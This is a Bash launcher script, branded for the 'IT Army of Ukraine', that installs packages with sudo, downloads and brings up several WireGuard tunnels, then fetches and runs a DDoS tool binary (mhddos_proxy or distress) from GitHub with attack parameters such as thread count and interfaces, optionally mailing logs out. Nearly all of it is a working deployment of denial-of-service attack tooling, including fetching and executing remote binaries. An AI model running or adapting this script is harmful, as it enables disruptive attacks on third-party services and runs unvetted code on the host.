#!/bin/bash
set -e

# === ASCII-ЛОГОТИП IT ARMY OF UA ===
echo -e "\e[1;33m"
cat << "EOF"
╔════════════════════════════════════════════════════════════════════════╗
║                                                                        ║
║   ██╗████████╗     █████╗ ██████╗ ███╗   ███╗██╗   ██╗                 ║
║   ██║╚══██╔══╝    ██╔══██╗██╔══██╗████╗ ████║╚██╗ ██╔╝                 ║
║   ██║   ██║       ███████║██████╔╝██╔████╔██║ ╚████╔╝                  ║
║   ██║   ██║       ██╔══██║██╔═══╝ ██║╚██╔╝██║  ╚██╔╝                   ║
║   ██║   ██║       ██║  ██║██║     ██║ ╚═╝ ██║   ██║                    ║
║   ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝   ╚═╝                    ║
║                                                                        ║
║                   💻  I T   A R M Y   O F   U K R A I N E              ║
╚════════════════════════════════════════════════════════════════════════╝
EOF
echo -e "\e[0m"

# === ЗМІННІ ===
SETTINGS_FILE="$HOME/.kaljan747_settings"
LOG_DIR="$HOME/logs"
LOG_FILE="$LOG_DIR/wg.log"
mkdir -p "$LOG_DIR"
touch "$LOG_FILE"

# === ЛОГУВАННЯ ===
log() {
    MSG="[$(date +'%Y-%m-%d %H:%M:%S')] $1"
    echo -e "\e[1;36m[LOG] $MSG\e[0m"
    echo "$MSG" >> "$LOG_FILE"
}

# === EMAIL-КОНФІГ ===
echo "Введіть email для отримання логів (або залиште порожнім):"
read EMAIL_TARGET
if [[ "$EMAIL_TARGET" =~ ^.+@.+\..+$ ]]; then
  echo "EMAIL=\"$EMAIL_TARGET\"" >> "$SETTINGS_FILE"
  echo -e "defaults\nauth on\ntls off\nlogfile ~/.msmtp.log\naccount default\nhost smtp.ukr.net\nport 2525\nfrom user@ukr.net\nuser user@ukr.net\npassword your_password\naccount default : default" > ~/.msmtprc
  chmod 600 ~/.msmtprc
fi

# === ФУНКЦІЇ GUI/CLI ===
ask_user_id() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
    else
        read -p "Введіть ваш user-id (тільки цифри): " USER_ID
    fi
}

ask_run_parameters() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
            --text="Вкажіть параметри запуску" \
            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
            --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
            --width=400)
        [ -z "$USER_SELECTION" ] && { echo "Запуск скасовано"; exit 1; }
        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
    else
        echo "Виберіть модуль:"
        echo "1) mhddos_proxy"
        echo "2) distress"
        read -p "Ваш вибір (1/2): " mod_choice
        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )
        echo "Редагувати INI перед запуском?"
        echo "1) Так"
        echo "2) Ні"
        read -p "Ваш вибір (1/2): " edit_choice
        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )
        echo "Виберіть режим запуску:"
        echo "1) screen у фоні"
        echo "2) screen відкрито"
        echo "3) без screen"
        read -p "Ваш вибір (1/2/3): " run_choice
        case "$run_choice" in
            1) SELECTED_RUN_MODE="screen у фоні";;
            2) SELECTED_RUN_MODE="screen відкрито";;
            3) SELECTED_RUN_MODE="без screen";;
        esac
    fi
}

# === ЗАПИТ НАЛАШТУВАНЬ ===
if [ -f "$SETTINGS_FILE" ]; then source "$SETTINGS_FILE"; fi
if [ -z "$USER_ID" ]; then while true; do ask_user_id; [[ "$USER_ID" =~ ^[0-9]+$ ]] && break; done; fi
if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then ask_run_parameters; fi

# === ПЕРЕВІРКА SUDO ===
if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO=$(command -v sudo || echo ""); fi
[ -z "$SUDO" ] && { echo "Потрібен sudo."; exit 1; }

# === ВСТАНОВЛЕННЯ ЗАЛЕЖНОСТЕЙ ===
$SUDO apt update -y
$SUDO apt install -y curl wget git screen sed wireguard msmtp zenity

# === ЗАВАНТАЖЕННЯ WG-КОНФІГІВ ===
WG_DIR="$HOME/wg_confs"
mkdir -p "$WG_DIR"
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=\").*?\\.conf(?=\")' | grep '/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
for url in $CONF_LIST; do wget -qO "$WG_DIR/$(basename $url)" "$url"; done
log "Конфіги WireGuard завантажено"

# === ПІДКЛЮЧЕННЯ ТУНЕЛІВ ===
INTERFACES=()
for conf in $(find "$WG_DIR" -name '*.conf' | shuf | head -n 4); do
    IFACE_NAME=$(basename "$conf" .conf)
    $SUDO wg-quick up "$conf" && INTERFACES+=("$IFACE_NAME")
    sleep 1
    log "Підключено $IFACE_NAME"
done

# === ВСТАНОВЛЕННЯ МОДУЛЯ ===
MODULE_DIR="$HOME/modules"
mkdir -p "$MODULE_DIR"
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_URL="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_URL="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac
wget -qO "$MODULE" "$MODULE_URL"
chmod +x "$MODULE"

# === СТВОРЕННЯ INI ===
INTERFACES_CSV=$(IFS=','; echo "${INTERFACES[*]}")
echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces ${INTERFACES[*]} --user-id=$USER_ID" > "$CONFIG_FILE"
log "INI створено: $CONFIG_FILE"

# === РЕДАГУВАННЯ INI ===
[ "$EDIT_INI" = "Так" ] && { [ -n "$DISPLAY" ] && zenity --text-info --editable --filename="$CONFIG_FILE" || nano "$CONFIG_FILE"; }

# === ЗАПУСК У SCREEN ===
case "$SELECTED_RUN_MODE" in
    "screen у фоні") screen -dmS "KALJAN747" "$MODULE" $(cat "$CONFIG_FILE") ;; 
    "screen відкрито") screen -S "KALJAN747" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac
log "Модуль $SELECTED_MODULE запущено"

# === ВІДПРАВКА ЛОГУ ===
if [ -n "$EMAIL_TARGET" ]; then
  echo -e "\n===== Kaljan747 Лог =====\n" | cat - "$LOG_FILE" | msmtp "$EMAIL_TARGET"
  log "Звіт відправлено на $EMAIL_TARGET"
fi

log "Готово. Слідкуйте за логом: $LOG_FILE"
